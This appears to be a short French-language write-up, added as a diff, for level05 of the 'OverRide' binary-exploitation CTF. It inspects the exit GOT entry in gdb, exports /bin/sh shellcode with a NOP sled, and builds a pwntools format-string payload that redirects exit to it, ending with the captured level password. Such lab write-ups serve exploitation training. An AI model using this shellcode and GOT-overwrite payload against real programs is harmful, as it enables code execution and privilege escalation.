@@ -1,0 +1,28 @@
+voir le address ou GOT exit va sauter sur
+Donc 
+(gdb) x/i 0x8048370
+0x8048370 <exit@plt>:	jmp    *0x80497e0 <-
+(gdb)
+
+level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")'`
+Et offset de nos shellcode
+level05@OverRide:~$ /tmp/shellcode
+0xffffd81c <- +10(SHELLCODE=)
+
+On a remarque que ce qu'on a tape dans la stack se trouve dans 10eme argument de printf
+
+>>> def send_fmt_payload(payload):
+...     print repr(payload)
+...
+>>> f = FmtStr(send_fmt_payload, offset=10)
+>>> f.write(0x80497e0, 0xffffd82d)
+>>> f.execute_writes()
+'\xe0\x97\x04\x08\xe1\x97\x04\x08\xe2\x97\x04\x08\xe3\x97\x04\x08%29c%10$hhn%171c%11$hhn%39c%12$hhn%13$hhn'
+>>>
+
+Notre string ne contient pas de characteres majuscule de ASCII donc notre string ne vont pas etre XORed
+
+level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08\xe1\x97\x04\x08\xe2\x97\x04\x08\xe3\x97\x04\x08%29c%10$hhn%171c%11$hhn%39c%12$hhn%13$hhn")' | ./level05
+                            d                                                                                                                                                                          �                                      �
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+level05@OverRide:~$
